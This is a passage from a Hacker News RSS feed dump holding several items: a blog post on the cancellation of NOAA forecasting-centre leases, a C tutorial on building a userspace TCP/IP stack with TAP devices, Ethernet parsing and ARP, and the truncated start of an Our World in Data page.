<figure><a href="https://i0.wp.com/thinc.blog/wp-content/uploads/2025/03/image-8.png?ssl=1"><img data-recalc-dims="1" decoding="async" width="840" height="420" data-attachment-id="106099" data-permalink="https://thinc.blog/2025/03/03/the-end-of-weather-forecasting/image-767/" data-orig-file="https://i0.wp.com/thinc.blog/wp-content/uploads/2025/03/image-8.png?fit=1200%2C600&amp;ssl=1" data-orig-size="1200,600" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="image" data-image-description="" data-image-caption="" data-medium-file="https://i0.wp.com/thinc.blog/wp-content/uploads/2025/03/image-8.png?fit=300%2C150&amp;ssl=1" data-large-file="https://i0.wp.com/thinc.blog/wp-content/uploads/2025/03/image-8.png?fit=840%2C420&amp;ssl=1" src="https://i0.wp.com/thinc.blog/wp-content/uploads/2025/03/image-8.png?resize=840%2C420&amp;ssl=1" alt="" srcset="https://i0.wp.com/thinc.blog/wp-content/uploads/2025/03/image-8.png?resize=1024%2C512&amp;ssl=1 1024w, https://i0.wp.com/thinc.blog/wp-content/uploads/2025/03/image-8.png?resize=300%2C150&amp;ssl=1 300w, https://i0.wp.com/thinc.blog/wp-content/uploads/2025/03/image-8.png?resize=768%2C384&amp;ssl=1 768w, https://i0.wp.com/thinc.blog/wp-content/uploads/2025/03/image-8.png?resize=700%2C350&amp;ssl=1 700w, https://i0.wp.com/thinc.blog/wp-content/uploads/2025/03/image-8.png?w=1200&amp;ssl=1 1200w" sizes="(max-width: 709px) 85vw, (max-width: 909px) 67vw, (max-width: 1362px) 62vw, 840px"></a><figcaption>Triumph of the War on Science</figcaption></figure></div>


<p>Got a heads up on this from a senior scientist who emailed today:</p>



<p><em>“If this happens, weather forecasting as we know it will end.”</em></p>



<p>Further underlined by<a href="https://bsky.app/profile/weatherwest.bsky.social/post/3ljj22cqucq2n" data-type="link" data-id="https://bsky.app/profile/weatherwest.bsky.social/post/3ljj22cqucq2n"> Daniel Swain</a>, well known to readers here.</p>


<div>
<figure><a href="https://i0.wp.com/thinc.blog/wp-content/uploads/2025/03/image-7.png?ssl=1"><img data-recalc-dims="1" decoding="async" width="840" height="189" data-attachment-id="106096" data-permalink="https://thinc.blog/2025/03/03/the-end-of-weather-forecasting/image-766/" data-orig-file="https://i0.wp.com/thinc.blog/wp-content/uploads/2025/03/image-7.png?fit=1524%2C344&amp;ssl=1" data-orig-size="1524,344" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="image" data-image-description="" data-image-caption="" data-medium-file="https://i0.wp.com/thinc.blog/wp-content/uploads/2025/03/image-7.png?fit=300%2C68&amp;ssl=1" data-large-file="https://i0.wp.com/thinc.blog/wp-content/uploads/2025/03/image-7.png?fit=840%2C189&amp;ssl=1" src="https://i0.wp.com/thinc.blog/wp-content/uploads/2025/03/image-7.png?resize=840%2C189&amp;ssl=1" alt="" srcset="https://i0.wp.com/thinc.blog/wp-content/uploads/2025/03/image-7.png?resize=1024%2C231&amp;ssl=1 1024w, https://i0.wp.com/thinc.blog/wp-content/uploads/2025/03/image-7.png?resize=300%2C68&amp;ssl=1 300w, https://i0.wp.com/thinc.blog/wp-content/uploads/2025/03/image-7.png?resize=768%2C173&amp;ssl=1 768w, https://i0.wp.com/thinc.blog/wp-content/uploads/2025/03/image-7.png?resize=1200%2C271&amp;ssl=1 1200w, https://i0.wp.com/thinc.blog/wp-content/uploads/2025/03/image-7.png?w=1524&amp;ssl=1 1524w" sizes="(max-width: 709px) 85vw, (max-width: 909px) 67vw, (max-width: 1362px) 62vw, 840px"></a></figure></div>


<p><a href="https://www.axios.com/2025/03/03/doge-noaa-weather-building-leases-trump" data-type="link" data-id="https://www.axios.com/2025/03/03/doge-noaa-weather-building-leases-trump">Axios:</a></p>



<p>The Trump administration has informed NOAA that two pivotal centers for&nbsp;<a href="https://www.axios.com/2025/03/02/major-storm-severe-outbreak-weather-service-layoffs">weather forecasting</a>will soon have their leases canceled, sources told Axios.&nbsp;</p>



<p><strong>Why it matters:&nbsp;</strong>One of the buildings is the nerve center for generating national weather forecasts.&nbsp;</p>



<ul>
<li>It was designed to integrate multiple forecasting centers in one building to improve operating efficiency. It houses telecommunications equipment to send weather data and forecasts across the U.S. and abroad.</li>
</ul>



<p><strong>Driving the news:&nbsp;</strong>The NOAA Center for Weather and Climate Prediction is on the lease cancellation list, according to a NOAA employee who spoke on condition of anonymity for fear of retribution.&nbsp;</p>



<ul>
<li>Two ex-National Oceanic and Atmospheric Administration officials also confirmed the list.</li>



<li>The building houses the National Weather Service’s National Centers for Environmental Prediction, or NCEP, which includes the Environmental Modeling Center. It&nbsp;<a href="https://www.weather.gov/media/wrn/1pgr_NCWCP.pdf" target="_blank" rel="noreferrer noopener">opened in 2012</a>and has about 268,000 square feet of space.</li>



<li>The modeling center runs the computer models used in day-to-day weather forecasting, and ensures that weather data correctly goes into these models and that they are operating correctly.&nbsp;</li>
</ul>



<p><strong>The lease cancellation</strong>&nbsp;was&nbsp;<a href="https://www.theverge.com/news/622990/trump-doge-government-layoffs-doge-weather-forecasts-noaa" target="_blank" rel="noreferrer noopener">first reported by The Verge</a>. The National Weather Service didn’t immediately respond to a request for comment.</p>



<ul>
<li>The NOAA employee told Axios the cancellations — along with recent layoffs, early retirements, and travel and hiring limitations — point to an effort to dismantle the agency.</li>
</ul>



<p><strong>Between the lines:&nbsp;</strong>Elon Musk’s&nbsp;<a href="https://www.axios.com/politics-policy/doge-department-of-government-efficiency">Department of Government Efficiency</a>&nbsp;(DOGE) has been working through the General Services Administration to cancel government leases of office space.</p>



<ul>
<li>The NOAA employee told Axios a nightmare scenario could unfold if the College Park building was shuttered, but the agency still was tasked with the same missions as at present.</li>



<li>In that case, NOAA would have to somehow replicate its functionality somewhere else in a process that could take a year or more and leave critical forecasting gaps.</li>



<li>It would also require new congressional appropriations to get that done.</li>
</ul>



<p><strong>The intrigue:&nbsp;</strong>The cancellation notice for the College Park facility isn’t final, as a spreadsheet detailing all the properties on the cancellation list has an end date of “TBD” for that building, according to the NOAA staff member.</p>




	</div><!-- .entry-content -->

	<!-- .entry-footer -->
</article><!-- #post-106095 -->

<!-- .comments-area -->

	<nav aria-label="Posts">
		<h2>Post navigation</h2>
		
	</nav>
	</main><!-- .site-main -->

	
</div><!-- .site-content -->

		<!-- .site-footer -->
	</div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[Let’s code a TCP/IP stack, 1: Ethernet and ARP (2016) (296 pts)]]></title>
            <link>https://www.saminiir.com/lets-code-tcp-ip-stack-1-ethernet-arp/</link>
            <guid>43250093</guid>
            <pubDate>Tue, 04 Mar 2025 03:55:00 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://www.saminiir.com/lets-code-tcp-ip-stack-1-ethernet-arp/">https://www.saminiir.com/lets-code-tcp-ip-stack-1-ethernet-arp/</a>, See on <a href="https://news.ycombinator.com/item?id=43250093">Hacker News</a></p>
<div id="readability-page-1" class="page"><div>

  

  <article>
    <p>Writing your own TCP/IP stack may seem like a daunting task. Indeed, TCP has accumulated many specifications over its lifetime of more than thirty years. The core specification, however, is seemingly compact<sup id="fnref:tcp-roadmap" role="doc-noteref"><a href="#fn:tcp-roadmap">1</a></sup> - the important parts being TCP header parsing, the state machine, congestion control and retransmission timeout computation.</p>

<p>The most common layer 2 and layer 3 protocols, Ethernet and IP respectively, pale in comparison to TCP’s complexity. In this blog series, we will implement a minimal userspace TCP/IP stack for Linux.</p>

<p>The purpose of these posts and the resulting software is purely educational - to learn network and system programming at a deeper level.</p>

<h2 id="contents">Contents</h2>

<ul id="markdown-toc">
  <li><a href="#tuntap-devices" id="markdown-toc-tuntap-devices">TUN/TAP devices</a></li>
  <li><a href="#ethernet-frame-format" id="markdown-toc-ethernet-frame-format">Ethernet Frame Format</a></li>
  <li><a href="#ethernet-frame-parsing" id="markdown-toc-ethernet-frame-parsing">Ethernet Frame Parsing</a></li>
  <li><a href="#address-resolution-protocol" id="markdown-toc-address-resolution-protocol">Address Resolution Protocol</a></li>
  <li><a href="#address-resolution-algorithm" id="markdown-toc-address-resolution-algorithm">Address Resolution Algorithm</a></li>
  <li><a href="#conclusion" id="markdown-toc-conclusion">Conclusion</a></li>
  <li><a href="#sources" id="markdown-toc-sources">Sources</a></li>
</ul>

<h2 id="tuntap-devices">TUN/TAP devices</h2>

<p>To intercept low-level network traffic from the Linux kernel, we will use a Linux TAP device. In short, a TUN/TAP device is often used by networking userspace applications to manipulate L3/L2 traffic, respectively. A popular example is <a href="https://www.saminiir.com/openvpn-puts-packets-inside-your-packets/#tunneling">tunneling</a>, where a packet is wrapped inside the payload of another packet.</p>

<p>The advantage of TUN/TAP devices is that they’re easy to set up in a userspace program and they are already being used in a multitude of programs, such as <a href="https://www.saminiir.com/openvpn-puts-packets-inside-your-packets/">OpenVPN</a>.</p>

<p>As we want to build the networking stack from the layer 2 up, we need a TAP device. We instantiate it like so:</p>

<figure><pre><code data-lang="c"><span>/*
 * Taken from Kernel Documentation/networking/tuntap.txt
 */</span>
<span>int</span> <span>tun_alloc</span><span>(</span><span>char</span> <span>*</span><span>dev</span><span>)</span>
<span>{</span>
    <span>struct</span> <span>ifreq</span> <span>ifr</span><span>;</span>
    <span>int</span> <span>fd</span><span>,</span> <span>err</span><span>;</span>

    <span>if</span><span>(</span> <span>(</span><span>fd</span> <span>=</span> <span>open</span><span>(</span><span>"/dev/net/tap"</span><span>,</span> <span>O_RDWR</span><span>))</span> <span>&lt;</span> <span>0</span> <span>)</span> <span>{</span>
        <span>print_error</span><span>(</span><span>"Cannot open TUN/TAP dev"</span><span>);</span>
        <span>exit</span><span>(</span><span>1</span><span>);</span>
    <span>}</span>

    <span>CLEAR</span><span>(</span><span>ifr</span><span>);</span>

    <span>/* Flags: IFF_TUN   - TUN device (no Ethernet headers)
     *        IFF_TAP   - TAP device
     *
     *        IFF_NO_PI - Do not provide packet information
     */</span>
    <span>ifr</span><span>.</span><span>ifr_flags</span> <span>=</span> <span>IFF_TAP</span> <span>|</span> <span>IFF_NO_PI</span><span>;</span>
    <span>if</span><span>(</span> <span>*</span><span>dev</span> <span>)</span> <span>{</span>
        <span>strncpy</span><span>(</span><span>ifr</span><span>.</span><span>ifr_name</span><span>,</span> <span>dev</span><span>,</span> <span>IFNAMSIZ</span><span>);</span>
    <span>}</span>

    <span>if</span><span>(</span> <span>(</span><span>err</span> <span>=</span> <span>ioctl</span><span>(</span><span>fd</span><span>,</span> <span>TUNSETIFF</span><span>,</span> <span>(</span><span>void</span> <span>*</span><span>)</span> <span>&amp;</span><span>ifr</span><span>))</span> <span>&lt;</span> <span>0</span> <span>){</span>
        <span>print_error</span><span>(</span><span>"ERR: Could not ioctl tun: %s</span><span>\n</span><span>"</span><span>,</span> <span>strerror</span><span>(</span><span>errno</span><span>));</span>
        <span>close</span><span>(</span><span>fd</span><span>);</span>
        <span>return</span> <span>err</span><span>;</span>
    <span>}</span>

    <span>strcpy</span><span>(</span><span>dev</span><span>,</span> <span>ifr</span><span>.</span><span>ifr_name</span><span>);</span>
    <span>return</span> <span>fd</span><span>;</span>
<span>}</span></code></pre></figure>

<p>After this, the returned file descriptor <code>fd</code> can be used to <code>read</code> and <code>write</code> data to the virtual device’s ethernet buffer.</p>

<p>The flag <code>IFF_NO_PI</code> is crucial here, otherwise we end up with unnecessary packet information prepended to the Ethernet frame. You can actually take a look at the kernel’s <a href="https://github.com/torvalds/linux/blob/v4.4/drivers/net/tun.c#L1306">source code</a> of the tun-device driver and verify this yourself.</p>

<h2 id="ethernet-frame-format">Ethernet Frame Format</h2>

<p>The multitude of different Ethernet networking technologies are the backbone of connecting computers in <em>Local Area Networks</em> (LANs). As with all physical technology, the Ethernet standard has greatly evolved from its first version<sup id="fnref:ethernet" role="doc-noteref"><a href="#fn:ethernet">2</a></sup>, published by Digital Equipment Corporation, Intel and Xerox in 1980.</p>

<p>The first version of Ethernet was slow in today’s standards - about 10Mb/s and it utilized half-duplex communication, meaning that you either sent or received data, but not at the same time. This is why a <em>Media Access Control</em> (MAC) protocol had to be incorporated to organize the data flow. Even to this day, <em>Carrier Sense, Multiple Access with Collision Detection</em> (CSMA/CD) is required as the MAC method if running an Ethernet interface in half-duplex mode.</p>

<p>The invention of the <em>100BASE-T</em> Ethernet standard used twisted-pair wiring to enable full-duplex communication and higher throughput speeds. Additionally, the simultaneous increase in popularity of Ethernet switches made CSMA/CD largely obsolete.</p>

<p>The different Ethernet standards are maintained by the IEEE 802.3<sup id="fnref:ieee-802-3" role="doc-noteref"><a href="#fn:ieee-802-3">3</a></sup> working group.</p>

<p>Next, we’ll take a look at the Ethernet Frame header. It can be declared as a C struct followingly:</p>

<figure><pre><code data-lang="c"><span>#include &lt;linux/if_ether.h&gt;
</span>
<span>struct</span> <span>eth_hdr</span>
<span>{</span>
    <span>unsigned</span> <span>char</span> <span>dmac</span><span>[</span><span>6</span><span>];</span>
    <span>unsigned</span> <span>char</span> <span>smac</span><span>[</span><span>6</span><span>];</span>
    <span>uint16_t</span> <span>ethertype</span><span>;</span>
    <span>unsigned</span> <span>char</span> <span>payload</span><span>[];</span>
<span>}</span> <span>__attribute__</span><span>((</span><span>packed</span><span>));</span></code></pre></figure>

<p>The <code>dmac</code> and <code>smac</code> are pretty self-explanatory fields. They contain the MAC addresses of the communicating parties (destination and source, respectively).</p>

<p>The overloaded field, <code>ethertype</code>, is a 2-octet field, that depending on its value, either indicates the length or the type of the payload. Specifically, if the field’s value is greater or equal to 1536, the field contains the type of the payload (e.g. IPv4, ARP). If the value is less than that, it contains the length of the payload.</p>

<p>After the type field, there is a possibility of several different <em>tags</em> for the Ethernet frame. These tags can be used to describe the <em>Virtual LAN</em> (VLAN) or the <em>Quality of Service</em> (QoS) type of the frame. Ethernet frame tags are excluded from our implementation, so the corresponding field also does not show up in our protocol declaration.</p>

<p>The field <code>payload</code> contains a pointer to the Ethernet frame’s payload. In our case, this will contain an ARP or IPv4 packet. If the payload length is smaller than the minimum required 48 bytes (without tags), pad bytes are appended to the end of the payload to meet the requirement.</p>

<p>We also include the <code>if_ether.h</code> Linux header to provide a mapping between ethertypes and their hexadecimal values.</p>

<p>Lastly, the Ethernet Frame Format also includes the <em>Frame Check Sequence</em> field in the end, which is used with <em>Cyclic Redundancy Check</em> (CRC) to check the integrity of the frame. We will omit the handling of this field in our implementation.</p>

<h2 id="ethernet-frame-parsing">Ethernet Frame Parsing</h2>

<p>The attribute <em>packed</em> in a struct’s declaration is an implementation detail - It is used to instruct the GNU C compiler not to optimize the struct memory layout for data alignment with padding bytes<sup id="fnref:gnu-c-packed" role="doc-noteref"><a href="#fn:gnu-c-packed">4</a></sup>. The use of this attribute stems purely out of the way we are “parsing” the protocol buffer, which is just a type cast over the data buffer with the proper protocol struct:</p>

<figure><pre><code data-lang="c"><span>struct</span> <span>eth_hdr</span> <span>*</span><span>hdr</span> <span>=</span> <span>(</span><span>struct</span> <span>eth_hdr</span> <span>*</span><span>)</span> <span>buf</span><span>;</span></code></pre></figure>

<p>A portable, albeit slightly more laborious approach, would be to serialize the protocol data manually. This way, the compiler is free to add padding bytes to conform better to different processor’s data alignment requirements.</p>

<p>The overall scenario for parsing and handling incoming Ethernet frames is straightforward:</p>

<figure><pre><code data-lang="c"><span>if</span> <span>(</span><span>tun_read</span><span>(</span><span>buf</span><span>,</span> <span>BUFLEN</span><span>)</span> <span>&lt;</span> <span>0</span><span>)</span> <span>{</span>
    <span>print_error</span><span>(</span><span>"ERR: Read from tun_fd: %s</span><span>\n</span><span>"</span><span>,</span> <span>strerror</span><span>(</span><span>errno</span><span>));</span>
<span>}</span>

<span>struct</span> <span>eth_hdr</span> <span>*</span><span>hdr</span> <span>=</span> <span>init_eth_hdr</span><span>(</span><span>buf</span><span>);</span>

<span>handle_frame</span><span>(</span><span>&amp;</span><span>netdev</span><span>,</span> <span>hdr</span><span>);</span></code></pre></figure>

<p>The <code>handle_frame</code> function just looks at the <code>ethertype</code> field of the Ethernet header, and decides its next action based upon the value.</p>

<h2 id="address-resolution-protocol">Address Resolution Protocol</h2>

<p>The <em>Address Resolution Protocol</em> (ARP) is used for dynamically mapping a 48-bit Ethernet address (MAC address) to a protocol address (e.g. IPv4 address). The key here is that with ARP, multitude of different L3 protocols can be used: Not just IPv4, but other protocols like CHAOS, which declares 16-bit protocol addresses.</p>

<p>The usual case is that you know the IP address of some service in your LAN, but to establish actual communications, also the hardware address (MAC) needs to be known. Hence, ARP is used to broadcast and query the network, asking the owner of the IP address to report its hardware address.</p>

<p>The ARP packet format is relatively straightforward:</p>

<figure><pre><code data-lang="c"><span>struct</span> <span>arp_hdr</span>
<span>{</span>
    <span>uint16_t</span> <span>hwtype</span><span>;</span>
    <span>uint16_t</span> <span>protype</span><span>;</span>
    <span>unsigned</span> <span>char</span> <span>hwsize</span><span>;</span>
    <span>unsigned</span> <span>char</span> <span>prosize</span><span>;</span>
    <span>uint16_t</span> <span>opcode</span><span>;</span>
    <span>unsigned</span> <span>char</span> <span>data</span><span>[];</span>
<span>}</span> <span>__attribute__</span><span>((</span><span>packed</span><span>));</span></code></pre></figure>

<p>The ARP header (<code>arp_hdr</code>) contains the 2-octet <code>hwtype</code>, which determines the link layer type used. This is Ethernet in our case, and the actual value is <code>0x0001</code>.</p>

<p>The 2-octet <code>protype</code> field indicates the protocol type. In our case, this is IPv4, which is communicated with the value <code>0x0800</code>.</p>

<p>The <code>hwsize</code> and <code>prosize</code> fields are both 1-octet in size, and they contain the sizes of the hardware and protocol fields, respectively. In our case, these would be 6 bytes for MAC addresses, and 4 bytes for IP addresses.</p>

<p>The 2-octet field <code>opcode</code> declares the type of the ARP message. It can be ARP request (1), ARP reply (2), RARP request (3) or RARP reply (4).</p>

<p>The <code>data</code> field contains the actual payload of the ARP message, and in our case, this will contain IPv4 specific information:</p>

<figure><pre><code data-lang="c"><span>struct</span> <span>arp_ipv4</span>
<span>{</span>
    <span>unsigned</span> <span>char</span> <span>smac</span><span>[</span><span>6</span><span>];</span>
    <span>uint32_t</span> <span>sip</span><span>;</span>
    <span>unsigned</span> <span>char</span> <span>dmac</span><span>[</span><span>6</span><span>];</span>
    <span>uint32_t</span> <span>dip</span><span>;</span>
<span>}</span> <span>__attribute__</span><span>((</span><span>packed</span><span>));</span></code></pre></figure>

<p>The fields are pretty self explanatory. <code>smac</code> and <code>dmac</code> contain the 6-byte MAC addresses of the sender and receiver, respectively. <code>sip</code> and <code>dip</code> contain the sender’s and receiver’s IP addresses, respectively.</p>

<h2 id="address-resolution-algorithm">Address Resolution Algorithm</h2>

<p>The <a href="https://tools.ietf.org/html/rfc826">original specification</a> depicts this simple algorithm for address resolution:</p>

<figure><pre><code data-lang="bash">?Do I have the hardware <span>type </span><span>in </span>ar<span>$hrd</span>?
Yes: <span>(</span>almost definitely<span>)</span>
  <span>[</span>optionally check the hardware length ar<span>$hln</span><span>]</span>
  ?Do I speak the protocol <span>in </span>ar<span>$pro</span>?
  Yes:
    <span>[</span>optionally check the protocol length ar<span>$pln</span><span>]</span>
    Merge_flag :<span>=</span> <span>false
    </span>If the pair &lt;protocol <span>type</span>, sender protocol address&gt; is
        already <span>in </span>my translation table, update the sender
        hardware address field of the entry with the new
        information <span>in </span>the packet and <span>set </span>Merge_flag to true.
    ?Am I the target protocol address?
    Yes:
      If Merge_flag is <span>false</span>, add the triplet &lt;protocol <span>type</span>,
          sender protocol address, sender hardware address&gt; to
          the translation table.
      ?Is the opcode ares_op<span>$REQUEST</span>?  <span>(</span>NOW look at the opcode!!<span>)</span>
      Yes:
        Swap hardware and protocol fields, putting the <span>local
            </span>hardware and protocol addresses <span>in </span>the sender fields.
        Set the ar<span>$op</span> field to ares_op<span>$REPLY</span>
        Send the packet to the <span>(</span>new<span>)</span> target hardware address on
            the same hardware on which the request was received.</code></pre></figure>

<p>Namely, the <code>translation table</code> is used to store the results of ARP, so that hosts can just look up whether they already have the entry in their cache. This avoids spamming the network for redundant ARP requests.</p>

<p>The algorithm is implemented in <a href="https://github.com/saminiir/level-ip/blob/e9ceb08f01a5499b85f03e2d615309c655b97e8f/src/arp.c#L53">arp.c</a>.</p>

<p>Finally, the ultimate test for an ARP implementation is to see whether it replies to ARP requests correctly:</p>

<figure><pre><code data-lang="bash"><span>[</span>saminiir@localhost lvl-ip]<span>$ </span>arping <span>-I</span> tap0 10.0.0.4
ARPING 10.0.0.4 from 192.168.1.32 tap0
Unicast reply from 10.0.0.4 <span>[</span>00:0C:29:6D:50:25]  3.170ms
Unicast reply from 10.0.0.4 <span>[</span>00:0C:29:6D:50:25]  13.309ms

<span>[</span>saminiir@localhost lvl-ip]<span>$ </span>arp
Address                  HWtype  HWaddress           Flags Mask            Iface
10.0.0.4                 ether   00:0c:29:6d:50:25   C                     tap0</code></pre></figure>

<p>The kernel’s networking stack recognized the ARP reply from our custom networking stack, and consequently populated its ARP cache with the entry of our virtual network device. Success!</p>

<h2 id="conclusion">Conclusion</h2>

<p>The minimal implementation of Ethernet Frame handling and ARP is relatively easy and can be done in a few lines of code. On the contrary, the reward-factor is quite high, since you get to populate a Linux host’s ARP cache with your own make-belief Ethernet device!</p>

<p>The source code for the project can be found at <a href="https://github.com/saminiir/level-ip">GitHub</a>.</p>

<p>In the next post, we’ll continue the implementation with ICMP echo &amp; reply (ping) and IPv4 packet parsing.</p>

<p>If you liked this post, you can
<a href="https://twitter.com/intent/tweet?url=https://www.saminiir.com/lets-code-tcp-ip-stack-1-ethernet-arp/&amp;text=Let%27s+code+a+TCP%2FIP+stack%2C+1%3A+Ethernet+%26+ARP&amp;via=saminiir" target="_blank">
  share it with your followers</a> 
and 
<a href="https://twitter.com/saminiir">
  follow me on Twitter</a>!</p>

<p><em>Kudos to Xiaochen Wang, whose similar implementation proved invaluable for me in getting up to speed with C network programming and protocol handling. I find his <a href="https://github.com/chobits/tapip">source code</a><sup id="fnref:tapip" role="doc-noteref"><a href="#fn:tapip">5</a></sup> easy to understand and some of my design choices were straight-out copied from his implementation.</em></p>

<h2 id="sources">Sources</h2>


  </article>

</div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[Global sales of combustion engine cars have peaked (223 pts)]]></title>
            <link>https://ourworldindata.org/data-insights/global-sales-of-combustion-engine-cars-have-peaked</link>
            <guid>43249068</guid>
            <pubDate>Tue, 04 Mar 2025 01:28:37 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://ourworldindata.org/data-insights/global-sales-of-combustion-engine-cars-have-peaked">https://ourworldindata.org/data-insights/global-sales-of-combustion-engine-cars-have-peaked</a>, See on <a href="https://news.ycombinator.com/item?id=43249068">Hacker News</a></p>
<div id="readability-page-1" class="page"><div><h2>Our latest Daily Data Insights</h2><a href="https://ourworldindata.org/data-insights">See all Daily Data Insights </a><div><a href="https://ourworldindata.org/data-insights#most-recent-data-insight"><div><picture><source srcset="https://ourworldindata.org/cdn-cgi/imagedelivery/qLq-8BTgXU8yG0N6HnOy8g/98ba9faf-1c56-44dc-45c0-2856416a0e00/w=48 48w, https://ourworldindata.org/cdn-cgi/imagedelivery/qLq-8BTgXU8yG0N6HnOy8g/98ba9faf-1c56-44dc-45c0-2856416a0e00/w=100 100w, https://ourworldindata.org/cdn-cgi/imagedelivery/qLq-8BTgXU8yG0N6HnOy8g/98ba9faf-1c56-44dc-45c0-2856416a0e00/w=350 350w, https://ourworldindata.org/cdn-cgi/imagedelivery/qLq-8BTgXU8yG0N6HnOy8g/98ba9faf-1c56-44dc-45c0-2856416a0e00/w=850 850w, https://ourworldindata.org/cdn-cgi/imagedelivery/qLq-8BTgXU8yG0N6HnOy8g/98ba9faf-1c56-44dc-45c0-2856416a0e00/w=1350 1350w, https://ourworldindata.org/cdn-cgi/imagedelivery/qLq-8BTgXU8yG0N6HnOy8g/98ba9faf-1c56-44dc-45c0-2856416a0e00/w=1620 1620w" type="image/png" sizes="(max-width: 960px) 95vw, (min-width: 960px) 533px"><img src="https://ourworldindata.org/cdn-cgi/imagedelivery/qLq-8BTgXU8yG0N6HnOy8g/98ba9faf-1c56-44dc-45c0-2856416a0e00/w=1620" alt="A bar chart displays the share of all births using assisted reproductive technology in various European countries for the year 2019. The countries are listed on the vertical axis, while the percentage of births is represented by horizontal bars extending to the right. 

Spain has the highest percentage at 8.9%, followed by Greece at 7.5% and Denmark at 6.3%. Other countries include Czechia at 6.2%, Estonia at 5.7%, and Iceland at 5.5%. 

The chart includes a note stating that the figures encompass all births in each country, possibly including cross-border treatment. The data source is the European Society of Human Reproduction and Embryology (2023) and the chart is published by Our World in Data." loading="lazy" data-filename="births-using-assisted-reproductive-technology-eshre.png" width="1620" height="2472"></picture></div><div><p>Today</p><h3>What share of births involve assisted reproductive technologies like IVF?</h3><div><p><span>In 1978, Louise Brown became the first baby born through in vitro fertilization (IVF). In this technique, eggs are fertilized with sperm in a lab before the resulting embryos are transferred to the uterus.</span></p><p><span>Assisted reproductive technologies have advanced further and now become widely available.</span></p><p><span>These innovations have helped many people who might otherwise struggle to conceive — supporting individuals and couples facing infertility, allowing older parents to preserve fertility, and enabling same-sex couples to have children.</span></p><p><span>The chart shows the share of births in 2019 that involved assisted reproductive technologies across various European countries. This can include cross-border treatment.</span></p><p><span>Spain had the highest share, with nearly 9% of births resulting from assisted reproductive technology, followed by Greece, Denmark, and Czechia. In contrast, countries like Ireland, Lithuania, Serbia, and Turkey had much lower rates, with less than 2% of all births.</span></p><p><span><span>Explore more data on fertility rates and reproductive technology</span></span><span> →</span></p></div></div></a><a href="https://ourworldindata.org/data-insights#second-most-recent-data-insight"><div><picture><source srcset="https://ourworldindata.org/cdn-cgi/imagedelivery/qLq-8BTgXU8yG0N6HnOy8g/9683a8af-c141-4138-d58d-ca92e70ecf00/w=48 48w, https://ourworldindata.org/cdn-cgi/imagedelivery/qLq-8BTgXU8yG0N6HnOy8g/9683a8af-c141-4138-d58d-ca92e70ecf00/w=100 100w, https://ourworldindata.org/cdn-cgi/imagedelivery/qLq-8BTgXU8yG0N6HnOy8g/9683a8af-c141-4138-d58d-ca92e70ecf00/w=350 350w, https://ourworldindata.org/cdn-cgi/imagedelivery/qLq-8BTgXU8yG0N6HnOy8g/9683a8af-c141-4138-d58d-ca92e70ecf00/w=850 850w, https://ourworldindata.org/cdn-cgi/imagedelivery/qLq-8BTgXU8yG0N6HnOy8g/9683a8af-c141-4138-d58d-ca92e70ecf00/w=1350 1350w, https://ourworldindata.org/cdn-cgi/imagedelivery/qLq-8BTgXU8yG0N6HnOy8g/9683a8af-c141-4138-d58d-ca92e70ecf00/w=1620 1620w" type="image/png" sizes="(max-width: 960px) 95vw, (min-width: 960px) 533px"><img src="https://ourworldindata.org/cdn-cgi/imagedelivery/qLq-8BTgXU8yG0N6HnOy8g/9683a8af-c141-4138-d58d-ca92e70ecf00/w=1620" alt="A bar chart titled &quot;Divorce within the first decade of marriage is becoming less common in England and Wales&quot; displays divorce rates for couples based on their marriage year. The x-axis represents the year of marriage, ranging from 1965 to 2012, while the y-axis indicates the percentage of those divorced by their 10-year anniversary. The bars show divorce rates after a decade over the years, with the highest rate of 25% for those married in 1990 and 1995 and the lowest at 10% for those married in 1965. The most recent data point is from 2012, showing 17.5% of couples divorced within a decade. A note highlights that fewer couples who have married since 2000 have divorced after a decade. The data source is the UK Office for National Statistics, dated 2024. The chart is licensed under CC BY." loading="lazy" data-filename="divorces-in-england.png" width="1620" height="1620"></picture></div><div><p>Yesterday</p><h3>Fewer marriages in England and Wales are ending in divorce within the first ten years</h3><div><p><span>Since 2000, fewer couples in England and Wales have divorced within the first ten years of marriage, reversing the trend of the late 20th century.</span></p><p><span>The chart shows the percentage of marriages ending in divorce within a decade, based on the year of marriage. For those married in 1965, one in ten divorced within ten years.</span></p><p><span>By 1975, this had nearly doubled to 18% as legal reforms made separation easier and less stigmatized. Divorce rates peaked for couples married in 1995, with one in four divorcing by their tenth anniversary.</span></p><p><span>But, as you can see, this trend has started to reverse.  Of the couples that married in 2012, only 17% had divorced by 2022. That’s well below the peak in the 1990s.</span></p><p><span><span>Explore our data on marriages and divorces in other countries</span></span><span> →</span></p></div></div></a><a href="https://ourworldindata.org/data-insights#third-most-recent-data-insight"><div><picture><source srcset="https://ourworldindata.org/cdn-cgi/imagedelivery/qLq-8BTgXU8yG0N6HnOy8g/c9d2e006-4c8b-47c9-501f-178f6b406b00/w=48 48w, https://ourworldindata.org/cdn-cgi/imagedelivery/qLq-8BTgXU8yG0N6HnOy8g/c9d2e006-4c8b-47c9-501f-178f6b406b00/w=100 100w, https://ourworldindata.org/cdn-cgi/imagedelivery/qLq-8BTgXU8yG0N6HnOy8g/c9d2e006-4c8b-47c9-501f-178f6b406b00/w=350 350w, https://ourworldindata.org/cdn-cgi/imagedelivery/qLq-8BTgXU8yG0N6HnOy8g/c9d2e006-4c8b-47c9-501f-178f6b406b00/w=850 850w, 